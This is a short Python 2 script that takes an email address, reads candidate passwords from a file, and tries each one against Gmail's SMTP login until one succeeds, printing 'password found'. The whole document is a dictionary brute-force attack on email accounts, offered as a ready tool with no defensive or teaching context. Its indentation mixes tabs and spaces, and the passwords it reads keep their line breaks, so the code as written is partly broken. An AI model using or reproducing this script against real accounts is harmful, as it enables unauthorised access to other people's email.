import smtplib
import getpass
from email.mime.text import MIMEText

def sendmail(email, pwd):

	print pwd

	try:
		smtpserver=smtplib.SMTP('smtp.gmail.com',587)
        	smtpserver.starttls()
        	smtpserver.login(email,pwd)
        	print('password found: {}'.format(pwd))
		return 1;
	except:
		return 0;
def main():
	email=raw_input("enter the email address\n")

	f = open('passwords.txt', 'r')
	for line in f:
		if(sendmail(email,line) == 1):
			break
       
if __name__ == '__main__':
	main()
